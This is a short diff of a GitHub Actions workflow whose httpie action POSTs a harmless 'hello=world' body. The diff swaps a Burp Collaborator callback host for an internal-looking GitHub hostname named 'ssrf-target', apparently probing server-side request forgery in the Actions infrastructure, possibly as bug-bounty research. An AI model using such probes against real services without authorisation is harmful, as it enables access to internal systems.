@@ -5,5 +5,5 @@ workflow "Call external API" {
 
 action "Call httpbin" {
   uses = "swinton/httpie.action@master"
-  args = ["POST", "gtdtxjblvpcwguejuwou2ayy6pci07.burpcollaborator.net/anything", "hello=world"]
+  args = ["POST", "ssrf-target.service.cp1-iad.github.net/rojanwashere", "hello=world"]
 }
